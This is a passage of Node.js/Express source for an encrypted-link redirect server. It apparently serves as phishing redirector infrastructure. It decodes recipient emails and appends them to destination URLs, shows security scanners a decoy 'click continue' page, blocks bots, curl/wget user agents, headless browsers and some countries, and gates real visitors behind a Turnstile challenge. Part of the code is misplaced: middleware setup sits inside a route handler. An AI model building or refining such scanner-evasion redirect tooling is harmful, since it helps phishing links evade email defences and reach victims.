      addLog("[TS] verify failed codes=" + JSON.stringify(data["error-codes"] || []));
      return { ok:false, reason:"not_success", data };
    }

    if (ENFORCE_ACTION && expected?.action && data.action !== expected.action)
      return { ok:false, reason:"bad_action", data };

    if (expected?.linkHash) {
      const raw = String(data.cdata||"");
      const m = /^([A-Za-z0-9_-]{8,})_([0-9]{9,})$/.exec(raw);
      const h = m ? m[1] : null;
      const tsSec = m ? parseInt(m[2],10) : 0;
      const age = Math.abs(Math.floor(Date.now()/1000) - tsSec);
      if (h !== expected.linkHash) {
        addLog(`[TS] cdata mismatch got=${h||'-'} want=${expected.linkHash} age=${age}s`);
        return { ok:false, reason:"bad_cdata_hash", data };
      }
      if (age > (expected.maxAgeSec||MAX_TOKEN_AGE_SEC)) return { ok:false, reason:"token_too_old", data, age };
    }

    if (EXPECT_HOSTNAME_LIST.length && data.hostname) {
      const got = normHost(data.hostname);
      const matched =
        EXPECT_HOSTNAME_EXACT.has(got) ||
        EXPECT_HOSTNAME_SUFFIX.some(s => got.endsWith(s));

      if (!matched) {
        addLog(`[TS-HOST-MISMATCH] got=${got} expectExact=[${[...EXPECT_HOSTNAME_EXACT].join(",")||"-"}] expectSuffix=[${EXPECT_HOSTNAME_SUFFIX.join(",")||"-"}]`);
        addSpacer();
        data.hostname = got;
        return { ok:false, reason:"bad_hostname", data };
      }

      data.hostname = got;
    }

    if (EXPECT_HOSTNAME && !EXPECT_HOSTNAME.includes(",") && !EXPECT_HOSTNAME.trim().startsWith(".") && data.hostname && data.hostname !== EXPECT_HOSTNAME) {
      addLog(`[TS-HOST-MISMATCH-LEGACY] got=${data.hostname} expect=${EXPECT_HOSTNAME}`);
      addSpacer();
      return { ok:false, reason:"bad_hostname", data };
    }

    addLog(`[TS] ok action=${data.action||'-'} hostname=${data.hostname||'-'} cdata=${String(data.cdata||'').slice(0,12)}…`);
    return { ok:true, data };
  } catch (e) {
    addLog("Turnstile verify error: " + e.message);
    return { ok:false, reason:"verify_error" };
  }
}

// ================== RATE LIMITERS ==================
const limitChallengeView = makeIpLimiter({ 
  capacity: parseInt(process.env.CHALLENGE_VIEW_CAPACITY || "5", 10), 
  windowSec: parseInt(process.env.CHALLENGE_VIEW_WINDOW_SEC || "300", 10), 
  keyPrefix: "challenge_view" 
});

const limitChallenge   = makeIpLimiter({ capacity: parseInt(process.env.CHALLENGE_CAPACITY || "12",10), windowSec: parseInt(process.env.CHALLENGE_WINDOW_SEC || "300",10), keyPrefix: "challenge" });
const limitTsClientLog = makeIpLimiter({ capacity: parseInt(process.env.TSLOG_CAPACITY || "30",10),      windowSec: parseInt(process.env.TSLOG_WINDOW_SEC || "300",10),      keyPrefix: "tslog" });
const limitSseUnauth   = makeIpLimiter({ capacity: parseInt(process.env.SSE_UNAUTH_CAPACITY || "10",10), windowSec: parseInt(process.env.SSE_UNAUTH_WINDOW_SEC || "60",10),  keyPrefix: "sse_unauth" });

// ================== CORE REDIRECT LOGIC ==================
function renderScannerSafePage(res, nextEnc, reason = "Pre-scan") {
  const challengeToken = createChallengeToken(nextEnc);
  res.setHeader("Cache-Control", "no-store");
  res.type("html").send(`<!doctype html><meta charset="utf-8">
<title>Checking link…</title>
<meta name="robots" content="noindex,nofollow">
<body style="font:16px system-ui;padding:24px;max-width:720px;margin:auto">
  <h1>Checking this link</h1>
  <p>This link was pre-scanned by security software. If you're the recipient, click continue.</p>
  <p><a href="/challenge?ct=${encodeURIComponent(challengeToken)}" rel="noopener">Continue</a></p>
  <p style="color:#6b7280;font-size:14px">Reason: ${reason}</p>
</body>`);
}

function checkSecurityPolicies(req) {
  const ip = getClientIp(req);
  const ua = req.get("user-agent") || "";
  
  if (isBanned(ip)) {
    addLog(`[BAN] blocked ip=${ip}`);
    addSpacer();
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  const scannerDetections = detectScannerEnhanced(req);
  if (scannerDetections.length > 0) {
    const topDetection = scannerDetections[0];
    addLog(`[SCANNER] interstitial ip=${ip} scanner="${topDetection.name}" confidence=${topDetection.confidence} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
    return { blocked: true, interstitial: true, scanner: topDetection.name };
  }

  const BAD_UA = /(okhttp|python-requests|curl|wget|phantomjs)/i;
  if (BAD_UA.test(ua)) {
    addLog(`[UA-BLOCK] ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
    addSpacer();
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  const hs = headlessSuspicion(req);
  if (hs.suspicious) {
    const softOnlyOne = (hs.hardCount === 0 && hs.softCount === 1);
    const label = (hs.hardCount >= 1)                         ? 'HEADLESS'
                : ((hs.isSafariUA || hs.isFirefoxUA) && softOnlyOne) ? 'INFO'
                : (hs.softCount >= 2)                          ? 'SUSPECT'
                : 'INFO';

    addLog(`[${label}] ip=${ip} reasons=${hs.reasons.join(',')}`);

    if (hs.hardCount > 0) {
      addStrike(ip, HEADLESS_STRIKE_WEIGHT);
    } else if (HEADLESS_SOFT_STRIKE && hs.softCount >= 2) {
      addStrike(ip, 1);
    }

    if (HEADLESS_BLOCK && hs.hardCount > 0) {
      addSpacer();
      return { blocked: true, status: 403, message: "Forbidden" };
    }
  }

  const ctry = getCountry(req);
  const asn  = getASN(req);
  if (countryBlocked(ctry)) {
    addLog(`[GEO] blocked country=${ctry} ip=${ip}`);
    addSpacer();
    return { blocked: true, status: 403, message: "Forbidden" };
  }
  if (asnBlocked(asn)) {
    addLog(`[ASN] blocked asn=${asn} ip=${ip}`);
    addSpacer();
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  return { blocked: false };
}

async function verifyTurnstileAndRateLimit(req, baseString) {
  const ip = getClientIp(req);
  const ua = req.get("user-agent") || "";
  
  const token = req.query.cft || req.get("cf-turnstile-response") || "";
  const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);

  const v = await verifyTurnstileToken(token, ip, { action:"link_redirect", linkHash, maxAgeSec:MAX_TOKEN_AGE_SEC });
  if (!v.ok) {
    const next = encodeURIComponent(baseString);
    const hostParam = (v.reason === "bad_hostname" && v.data && v.data.hostname)
      ? `&host=${encodeURIComponent(v.data.hostname)}`
      : "";
    addLog(`[AUTH] token invalid (${v.reason}) ip=${ip} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}" -> /challenge`);
    return { redirect: `/challenge?next=${next}${hostParam}` };
  }

  const { limited, retryAfterMs } = await isRateLimited(ip);
  if (limited) {
    if (retryAfterMs && Number.isFinite(retryAfterMs)) {
      return { blocked: true, status: 429, retryAfter: Math.ceil(retryAfterMs/1000), message: "Too many requests" };
    }
    addLog(`[RL] 429 ip=${ip}`);
    addSpacer();
    return { blocked: true, status: 429, message: "Too many requests" };
  }

  return { success: true };
}

function decryptAndParseUrl(req, baseString) {
  const ip = getClientIp(req);
  
  const { mainPart, emailPart: emailPart0, delimUsed } =
    splitCipherAndEmail(baseString, decodeB64urlLoose, isLikelyEmail);

  if (delimUsed) {
    addLog(`[PARSE] delimiter used "${delimUsed}" mainLen=${mainPart.length} emailRawLen=${(emailPart0 || '').length}`);
  }

  let result = null;
  try {
    result = tryDecryptAny(mainPart);
  } catch (e) {
    addLog(`[DECRYPT] exception ip=${ip} seg="${String(mainPart).slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" err=${e.message}`);
    addSpacer();
    return { error: "Failed to load" };
  }
  
  let finalUrl = result && result.url;
  let emailPart = emailPart0 || null;

  if (!finalUrl) {
    const bf = bruteSplitDecryptFull(baseString);
    if (bf && bf.url) {
      finalUrl = bf.url;
      if (!emailPart) emailPart = bf.emailRaw || null;
      addLog(`[DECRYPT] fallback split used k=${bf.kTried} emailRawLen=${(bf.emailRaw || '').length}`);
    }
  }

  if (!finalUrl) {
    const why = explainDecryptFailure({
      tried: result?.tried || [],
      lastErr: result?.lastErr || null,
      segLen: mainPart.length
    });
    addLog(`[DECRYPT] failed variants ip=${ip} seg="${String(mainPart).slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" mainLen=${mainPart.length} why=${why}`);
    addSpacer();
    return { error: "Failed to load" };
  }

  return { finalUrl, emailPart };
}

function processEmailAndFinalizeUrl(finalUrl, emailPart) {
  if (emailPart) {
    const emailRaw = String(emailPart).replace(/[\/~]+$/,'');
    const emailDecoded = (decodeB64urlLoose(emailRaw) || safeDecode(emailRaw)).trim();

    if (emailDecoded && isLikelyEmail(emailDecoded)) {
      finalUrl += '#' + emailDecoded;
      addLog(`[EMAIL] captured ${maskEmail(emailDecoded)}`);
    } else if (emailDecoded) {
      addLog(`[EMAIL] ignored (not a valid email): "${emailDecoded.slice(0,EMAIL_DISPLAY_MAX_LENGTH)}" (raw="${emailPart.slice(0,40)}…")`);
    } else {
      addLog(`[EMAIL] ignored (decode empty) raw="${emailPart.slice(0,40)}…"`);
    }
  }

  return finalUrl;
}

function validateAndRedirect(finalUrl, req, res) {
  const ip = getClientIp(req);
  
  try {
    const hostname = new URL(finalUrl).hostname;
    const okHost =
      ALLOWLIST_DOMAINS.includes(hostname) ||
      ALLOWLIST_SUFFIXES.some(s => hostname.endsWith(s));

    if (!okHost) {
      addLog(`[ALLOWLIST] blocked host=${hostname} ip=${ip}`);
      addSpacer();
      return res.status(403).send("Unauthorized URL");
    }

    addLog(`[REDIRECT] ip=${ip} -> ${finalUrl}`);
    addSpacer();
    return res.redirect(finalUrl);
  } catch (e) {
    addLog(`[URL] invalid ip=${ip} value="${(finalUrl || "").slice(0,URL_DISPLAY_MAX_LENGTH)}" err="${e.message}"`);
    addSpacer();
    return res.status(400).send("Invalid URL");
  }
}

async function handleRedirectCore(req, res, baseString){
  const securityCheck = checkSecurityPolicies(req);
  if (securityCheck.blocked) {
    if (securityCheck.interstitial) {
      const nextEnc = encodeURIComponent(baseString);
      logScannerHit(req, "Known scanner UA", nextEnc);
      return renderScannerSafePage(res, nextEnc, "Known scanner UA");
    }
    return res.status(securityCheck.status).send(securityCheck.message);
  }

  const authCheck = await verifyTurnstileAndRateLimit(req, baseString);
  if (authCheck.redirect) {
    return res.redirect(302, authCheck.redirect);
  }
  if (authCheck.blocked) {
    if (authCheck.retryAfter) {
      res.setHeader("Retry-After", authCheck.retryAfter);
    }
    return res.status(authCheck.status).send(authCheck.message);
  }

  const ua = req.get("user-agent") || "";
  const knownBots = ["Googlebot","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebot","facebookexternalhit","ia_archiver","MJ12bot","AhrefsBot","SemrushBot","DotBot","PetalBot","GPTBot","python-requests","crawler","scrapy","curl","wget","phantomjs","HeadlessChrome"];
  const isBotUA = knownBots.some(b => ua.toLowerCase().includes(b.toLowerCase()));
  if (isBotUA) {
    addLog(`[BOT] blocked ip=${getClientIp(req)} ua="${ua.slice(0,UA_TRUNCATE_LENGTH)}"`);
    addSpacer();
    return res.status(403).send("Not allowed");
  }

  const hasSecUA = !!req.get("sec-ch-ua");
  const hasFetchSite = !!req.get("sec-fetch-site");
  if (!hasSecUA || !hasFetchSite) {
    addLog(`[SUSPECT] ip=${getClientIp(req)} missing_sec_headers=${!hasSecUA||!hasFetchSite}`);
  }

  const decryptResult = decryptAndParseUrl(req, baseString);
  if (decryptResult.error) {
    return res.status(400).send(decryptResult.error);
  }

  const finalUrl = processEmailAndFinalizeUrl(decryptResult.finalUrl, decryptResult.emailPart);
  return validateAndRedirect(finalUrl, req, res);
}

// ================== MIDDLEWARE SETUP ==================
app.use(cors());
app.use(express.json({ limit: "64kb" }));
app.use(express.urlencoded({ extended: false, limit: "64kb" }));

app.use((err, req, res, next) => {
  if (err instanceof SyntaxError && err.type === "entity.parse.failed") {
    try { addLog(`[TS-CLIENT] JSON parse error: ${String(err.message||'').slice(0,120)}`); addSpacer(); } catch {}
    req.body = null;
    return next();
  }
  return next(err);
});

app.use((req, res, next) => {
  res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Permissions-Policy", "interest-cohort=(), browsing-topics=()");
  res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
  if (process.env.ENABLE_HSTS === "1") {
    res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
  }
  next();
});

// Apply rate limiters BEFORE routes
app.use("/challenge", limitChallenge);
app.use("/ts-client-log", limitTsClientLog);
app.use("/stream-log", (req, res, next) => {
  if (isAdminSSE(req)) return next();
  return limitSseUnauth(req, res, next);
});

// ================== ROUTES ==================
app.post("/decrypt-challenge-data", 
  express.json({ limit: "1kb" }),
  (req, res) => {
    const { data } = req.body || {};
    if (!data) return res.json({ success: false, error: "No data" });
    
    const payload = decryptChallengeData(data);
    if (!payload) return res.json({ success: false, error: "Decryption failed" });
    
    if (Date.now() - payload.ts > 5 * 60 * 1000) {
      return res.json({ success: false, error: "Payload expired" });
    }
    
    res.json({ success: true, payload });
  }
);

app.get("/health", (_req, res) => res.json({ ok:true, time:new Date().toISOString() }));

app.post(
  "/ts-client-log",
  express.text({ type: "*/*", limit: "64kb" }),
  (req, res) => {
    const ip  = getClientIp(req) || "unknown";
    const ua  = (req.get("user-agent") || "").slice(0, UA_TRUNCATE_LENGTH);
    const ct  = req.get("content-type") || "-";
    const len = req.get("content-length") || "0";

    let payload = null;

    if (req.body && typeof req.body === "object" && !Buffer.isBuffer(req.body)) {
      payload = req.body;
    } else {
      const raw = typeof req.body === "string" ? req.body : "";

      if (raw && raw.trim()) {
        try { payload = JSON.parse(raw); } catch { }
      }

      if ((!payload || typeof payload !== "object") && raw && raw.includes("=")) {
        try {
          const params = new URLSearchParams(raw);
          const obj = {};
          for (const [k, v] of params.entries()) obj[k] = v;
          payload = obj;
        } catch { }
      }

      if (!payload) req.__rawPreview = raw.slice(0, 200);
    }

    if (!payload || typeof payload !== "object" || !payload.phase) {
      const preview = req.__rawPreview != null
        ? JSON.stringify(req.__rawPreview)
        : (typeof req.body === "object" ? JSON.stringify(req.body).slice(0, 200) : '""');
      addLog(`[TS-CLIENT:empty] ip=${ip} ua="${ua}" ct=${ct} len=${len} preview=${preview}`);
      return res.status(204).end();
    }

    addLog(`[TS-CLIENT:${payload.phase}] ip=${ip} ua="${ua}" ${JSON.stringify(payload)}`);
    addSpacer();
    res.status(204).end();
  }
);

app.get("/stream-log", (req, res) => {
  if (!isAdminSSE(req)) return res.status(403).end("Forbidden: missing admin token (SSE)");

  res.setHeader("Content-Type", "text/event-stream; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-transform");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders?.();

  try { res.write(": connected\n\n"); } catch {}

  const lastIdHdr = req.get("last-event-id");
  const lastId = lastIdHdr ? parseInt(lastIdHdr, 10) : NaN;
  let startIdx = Math.max(0, LOG_IDS.length - BACKLOG_ON_CONNECT);
  if (Number.isFinite(lastId) && lastId >= 0) {
    const pos = LOG_IDS.lastIndexOf(lastId);
    if (pos >= 0) startIdx = pos + 1;
  } else {
    res.write(`event: reset\ndata: {"ts":${Date.now()}}\n\n`);
  }

  for (let i = startIdx; i < LOGS.length; i++) {
    sseSend(res, LOGS[i], LOG_IDS[i]);
  }

  LOG_LISTENERS.add(res);

  try { res.write(": hb-ready\n\n"); } catch {}

  const hb = setInterval(() => { try { res.write(": ping\n\n"); } catch {} }, 25000);

  let cleaned = false;
  function cleanup() {
    if (cleaned) return;
    cleaned = true;
    try { clearInterval(hb); } catch {}
    LOG_LISTENERS.delete(res);
  }

  req.once("aborted", cleanup);
  req.once("close", cleanup);
  res.once("close", cleanup);
  res.once("error", cleanup);
  res.once("finish", cleanup);

  req.socket?.setTimeout?.(0);
  req.socket?.setKeepAlive?.(true);
});

app.get("/view-log-live", (req, res) => {
  if (!(isAdmin(req) || isAdminSSE(req))) {
    return res.status(401).type("text/plain").send("Unauthorized");
  }

  res.setHeader("Cache-Control", "no-store");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; connect-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'"
  );

  const pageTok = req.query.token && String(req.query.token);
  const tok = pageTok || mintEphemeralToken();
  const streamUrl = `/stream-log?token=${encodeURIComponent(tok)}`;

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.send(`<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="referrer" content="no-referrer" />
  <meta name="color-scheme" content="dark light" />
  <title>Live Logs</title>
  <style>
    body{margin:0;font:14px/1.4 ui-monospace,Menlo,Consolas,monospace}
    #log{padding:12px;white-space:pre-wrap;word-break:break-word}
    .status{color:#888;padding:8px 12px}
  </style>
</head>
<body>
  <div class="status">Connecting…</div>
  <pre id="log"></pre>
  <script>
    const logEl = document.getElementById('log');
    const statusEl = document.querySelector('.status');
    const es = new EventSource(${JSON.stringify(streamUrl)});

    es.onopen = () => {
      statusEl.textContent = 'Connected';
    };

    es.addEventListener('reset', () => {
      logEl.textContent = '';
      statusEl.textContent = 'Repainting…';
    });

    es.onmessage = (e) => {
      logEl.textContent += e.data + '\\n';
      statusEl.textContent = '';
      window.scrollTo(0, document.body.scrollHeight);
    };

    es.onerror = (e) => {
      statusEl.textContent = 'Disconnected — retrying…';
      console.debug('SSE error', e, 'readyState=', es.readyState);
    };
  </script>
</body>
</html>`);
});

app.get("/view-log", requireAdmin, (req, res) => {
  return res.type("text/plain").send(LOGS.join("\n") || "No logs yet.");
});

app.get("/geo-debug", (req, res) => {
  if (!isAdmin(req)) return res.status(403).send("Forbidden");
  res.json({
    ip: getClientIp(req),
    resolvedCountry: getCountry(req),
    headers: {
      "cf-ipcountry": req.headers["cf-ipcountry"] || null,
      "cf-edge-country": req.headers["cf-edge-country"] || null,
      "x-nf-geo": req.headers["x-nf-geo"] || null,
      "x-vercel-ip-country": req.headers["x-vercel-ip-country"] || null
    }
  });
});

app.get("/favicon.ico", (_req, res) => {
  res.set("Cache-Control","public, max-age=86400");
  return res.status(204).end();
});

app.get("/robots.txt", (req, res) => {
  res.setHeader("Cache-Control", "public, max-age=3600");
  res.type("text/plain");

  if (process.env.ROBOTS_CONTENT) {
    return res.send(process.env.ROBOTS_CONTENT);
  }

  const p = path.join(process.cwd(), "robots.txt");
  if (fs.existsSync(p)) {
    return res.send(fs.readFileSync(p, "utf8"));
  }

  return res.send("User-agent: *\nDisallow: /\n");
});

app.get("/turnstile-sitekey", (_req, res) => res.json({ sitekey: TURNSTILE_SITEKEY }));

app.get("/__debug/key", requireAdmin, (req, res) => {
  const items = AES_KEYS.map((buf, idx) => {
    const sha = crypto.createHash("sha256").update(buf).digest("hex");
    const b64url = buf.toString("base64url");
    return {
      index: idx,
      len: buf.length,
      sha256: sha,
      b64url: DEBUG_ALLOW_PLAINTEXT_KEYS ? b64url : mask(b64url),
      note: buf.length === 32 ? "OK (32 bytes)" : "Unexpected length"
    };
  });
  res.json({ ok:true, count: items.length, keys: items });
});

app.get("/__debug/decrypt", requireAdmin, (req, res) => {
  const d = String(req.query.d || "");
  const out = tryDecryptAny(d);
  if (out && out.url) return res.status(200).type("text/plain").send(out.url);
  const bf = bruteSplitDecryptFull(d);
  if (bf && bf.url) return res.status(200).type("text/plain").send(bf.url);
  const tried = (out && out.tried) ? out.tried.join("|") : "none";
  return res.status(200).type("text/plain").send("fail; tried=" + tried);
});

app.get("/__hp.gif", (req, res) => {
  const ip = getClientIp(req);
  addLog(`[HP] honeypot hit ip=${ip} ua="${(req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH)}"`);
  addStrike(ip, STRIKE_WEIGHT_HP);
  res.set("Cache-Control","no-store");
  return res.status(204).end();
});

app.post("/admin/unban", (req, res) => {
  if (!isAdmin(req)) return res.status(403).send("Forbidden");
  const ip = String(req.query.ip||"").trim();
  if (!ip) return res.status(400).send("ip required");
  if (!inMemBans.has(ip)) return res.json({ok:true, message:"not banned"});
  inMemBans.delete(ip);
  return res.json({ok:true, message:"unbanned", ip});
});

app.post("/admin/strike-reset", (req, res) => {
  if (!isAdmin(req)) return res.status(403).send("Forbidden");
  const ip = String(req.query.ip||"").trim();
  if (!ip) return res.status(400).send("ip required");
  inMemStrikes.delete(ip);
  return res.json({ok:true, message:"strikes reset", ip});
});

app.get(
  "/admin/scanner-stats",
  (req, res, next) => {
    if (isAdmin(req) || isAdminSSE(req)) return next();
    addLog(`[ADMIN] scanner-stats denied ip=${getClientIp(req)} ua="${(req.get("user-agent")||"").slice(0,UA_TRUNCATE_LENGTH)}"`);
    return res.status(401).type("text/plain").send("Unauthorized");
  },
  
  (req, res) => {
    const derived = computeScannerStatsFromLogs();
    const use = (derived && derived.total > 0) ? derived : {
      total: SCANNER_STATS.total,
      byReason: SCANNER_STATS.byReason,
      byUA: SCANNER_STATS.byUA
    };

    const topUA = Object.entries(use.byUA || {})
      .sort((a,b) => b[1] - a[1])
      .slice(0, 20)
      .map(([ua, count]) => ({ ua, count }));

    res.json({
      ok: true,
      source: (derived && derived.total > 0) ? "logs" : "counters",
      total: use.total || 0,
      byReason: use.byReason || {},
      topUA,
      now: new Date().toISOString()
    });
  }
);

const adminHits = new Map();
app.use(["/view-log", "/__debug", "/admin"], (req, res, next) => {
  if (isAdmin(req)) return next();
  const ip = getClientIp(req) || "unknown";
  const now = Date.now();
  const winMs = 60_000;
  const rec = adminHits.get(ip) || { count: 0, resetAt: now + winMs };
  if (now > rec.resetAt) { rec.count = 0; rec.resetAt = now + winMs; }
  rec.count++;
  adminHits.set(ip, rec);
  if (rec.count > 120) return res.status(429).send("Too Many Requests");
  next();
});

app.get("/challenge", limitChallengeView, (req, res) => {
  let nextEnc = "";
  
  if (req.query.ct) {
    const payload = verifyChallengeToken(String(req.query.ct));
    if (!payload) {
      addLog(`[CHALLENGE] Invalid or expired challenge token`);
      return res.status(400).send("Invalid or expired challenge link");
    }
    nextEnc = payload.next;
    addLog(`[CHALLENGE] Valid token nextLen=${nextEnc.length} age=${Date.now() - payload.ts}ms`);
  } else if (req.query.next) {
    nextEnc = String(req.query.next);
    addLog(`[CHALLENGE] LEGACY next parameter used len=${nextEnc.length} - consider updating links`);
  } else {
    return res.status(400).send("Missing challenge data");
  }

  const nextPath = safeDecode(nextEnc);
  const [baseOnly] = nextPath.split("?");
  const linkHash = hashFirstSeg(baseOnly);
  const cdata = `${linkHash}_${Math.floor(Date.now()/1000)}`;

  addLog(`[CHALLENGE] secured next='${nextEnc.slice(0,20)}…' cdata=${cdata.slice(0,16)}…`);
  addLog(`[TS-PAGE] sitekey=${TURNSTILE_SITEKEY.slice(0,12)}… hash=${linkHash.slice(0,8)}…`);

app.use((req, res, next) => {
  res.setHeader("Cache-Control", "no-store");
  
  // Tighter (recommended):
  res.setHeader(
    "Permissions-Policy",
    'private-token=(self "https://challenges.cloudflare.com" "https://challenges.fed.cloudflare.com" "https://challenges-staging.cloudflare.com")'
  );

  res.setHeader("Content-Security-Policy", [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://challenges.cloudflare.com https://challenges.fed.cloudflare.com https://challenges-staging.cloudflare.com",
    "frame-src 'self' https://challenges.cloudflare.com https://challenges.fed.cloudflare.com https://challenges-staging.cloudflare.com https://*.cloudflare.com",
    "style-src 'self' 'unsafe-inline' https://challenges.cloudflare.com https://challenges.fed.cloudflare.com https://challenges-staging.cloudflare.com",
    "img-src 'self' data: https:",
    "connect-src 'self' https://challenges.cloudflare.com https://challenges.fed.cloudflare.com https://challenges-staging.cloudflare.com https://*.cloudflare.com",
    "font-src 'self' data: https:",
    "worker-src 'self' blob:",
    
    // hardening
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    "frame-ancestors 'self'"
  ].join('; '));

  next();
});
  
  const challengePayload = {
    sitekey: TURNSTILE_SITEKEY,
    cdata: cdata,
    next: nextEnc,
    lh: linkHash,
    ts: Date.now()
  };
  
  const encryptedData = encryptChallengeData(challengePayload);

  const htmlContent = `<!doctype html><html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="color-scheme" content="dark light">
<meta name="theme-color" content="#0c1116">
<meta name="robots" content="noindex,nofollow">
<title>Verify you are human</title>
<style>
  :root{
    --bg:#0c1116; --card:#0c1116; --text:#e8eef6; --muted:#93a1b2;
    --accent:#0ea5e9; --ring:rgba(255,255,255,0.05); --border:rgba(255,255,255,0.06);
  }
  @media (prefers-color-scheme: light){
    :root{
      --bg:#f7fafc; --card:#ffffff; --text:#0b1220; --muted:#516173;
      --accent:#0ea5e9; --ring:#e8eef5; --border:#e7eef6;
    }
  }
  *{ box-sizing:border-box; }
  html,body{ height:100%; }
  body{
    margin:0; background:var(--bg); color:var(--text);
    font:16px/1.45 system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial,sans-serif;
    -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
    display:flex; align-items:center; justify-content:center;
    padding:clamp(16px,4vw,40px);
  }
  .card{
    width:100%; max-width:760px; text-align:center;
    background:var(--card);
    border:1px solid var(--border);
    border-radius:16px;
    padding:clamp(22px,3vw,34px);
    box-shadow: 0 20px 50px rgba(0,0,0,.35), 0 0 0 1px rgba(255,255,255,.02) inset;
  }
  h2{ margin:0 0 10px; font-size:clamp(26px,3.4vw,38px); letter-spacing:.2px; }
  .muted{ color:var(--muted); }
  #ts{ display:inline-block; margin-top:12px; }
  .status{ margin-top:12px; color:var(--muted); font-size:14px; min-height:20px; }
  .err{ color:#ef4444; }
</style>

<script>
  const ENCRYPTED_DATA = ${JSON.stringify(encryptedData)};

  window.__sid = (Math.random().toString(36).slice(2) + Date.now().toString(36));
  function clientContext(extra = {}) {
    return {
      phase: extra.phase || 'context',
      sid: window.__sid,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      lang: navigator.language,
      online: navigator.onLine,
      vis: document.visibilityState,
      ref: document.referrer || '',
      ts: Date.now(),
      ...extra
    };
  }

  window.addEventListener('error', (e) => {
    fetch('/ts-client-log', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(clientContext({
        phase:'window-error',
        filename: e.filename, lineno: e.lineno, colno: e.colno,
        message: String(e.message||'')
      }))
    });
  }, true);

  window.addEventListener('unhandledrejection', (e) => {
    fetch('/ts-client-log', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(clientContext({
        phase:'unhandledrejection',
        reason: String(e.reason && (e.reason.stack||e.reason.message||e.reason) || '')
      }))
    });
  });

  function decryptChallengeData(encrypted) {
    return fetch('/decrypt-challenge-data', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ data: encrypted })
    }).then(r => r.json());
  }

  function onOK(token){
    const s = document.getElementById('status'); s.textContent = 'Verifying…';

    decryptChallengeData(ENCRYPTED_DATA).then(data => {
      if (!data.success) throw new Error('Decryption failed');

      const { next, lh } = data.payload;

      try {
        const decoded = decodeURIComponent(next);
        const parts = decoded.split('?');
        const base = parts[0];
        const qs = parts[1] || '';
        const sp = new URLSearchParams(qs);
        sp.delete('cft'); sp.delete('lh');
        sp.append('cft', token);
        sp.append('lh', lh);
        const suffix = '&' + sp.toString();
        location.href = '/r?d=' + encodeURIComponent(base) + suffix;
      } catch(e) {
        s.textContent = 'Navigation error. Please retry.';
        fetch('/ts-client-log', {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify(clientContext({ phase:'callback-nav', msg:e.message, stack:e.stack }))
        });
      }
    }).catch(e => {
      s.textContent = 'Security error. Please refresh.';
      fetch('/ts-client-log', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify(clientContext({ phase:'decrypt-error', msg:e.message }))
      });
    });
  }

let __tsRetries = 0;
  const __tsMaxRetries = 3;

  function renderTurnstile(sitekey, cdata){
    try { window.turnstile.remove('#ts'); } catch(_){}
    window.turnstile.render('#ts', {
      sitekey,
      action: 'link_redirect',
      cData: cdata,
      appearance: 'always',
      callback: onOK,
      'error-callback': onErr,
      'timeout-callback': onTimeout
    });
  }
  
  function onErr(errCode){
    const s = document.getElementById('status');
    s.textContent = 'Loading security check…';
    console.warn('Turnstile error code:', errCode);

    // bounded backoff: ~0.8s, 1.6s, 2.4s
    if (__tsRetries < __tsMaxRetries) {
      const delay = 800 * (__tsRetries + 1);
      __tsRetries++;
      decryptChallengeData(ENCRYPTED_DATA).then(({success, payload}) => {
        if (success) setTimeout(() => renderTurnstile(payload.sitekey, payload.cdata), delay);
      });
    } else {
      s.textContent = 'Failed to load challenge. Check network/adblock. Try refreshing.';
    }

    fetch('/ts-client-log', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(clientContext({ phase:'error-callback', code: String(errCode||'') }))
    });
  }

  function onTimeout(){
    document.getElementById('status').textContent = 'Challenge timed out. Refresh the page.';
    fetch('/ts-client-log', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(clientContext({ phase:'timeout', webdriver: !!(navigator.webdriver ?? false) }))
    });
  }

  function boot(){
    decryptChallengeData(ENCRYPTED_DATA).then(data => {
      if (!data.success) throw new Error('Decryption failed');

      const { sitekey, cdata } = data.payload;

      if (!window.turnstile) { setTimeout(boot, 200); return; }
      // NEW:
      renderTurnstile(sitekey, cdata);

      document.getElementById('status').textContent = 'Challenge ready.';
    }).catch(e => {
      document.getElementById('status').textContent = 'Security initialization failed. Refresh.';
      fetch('/ts-client-log', {
        method:'POST', headers:{'Content-Type':'application/json'},
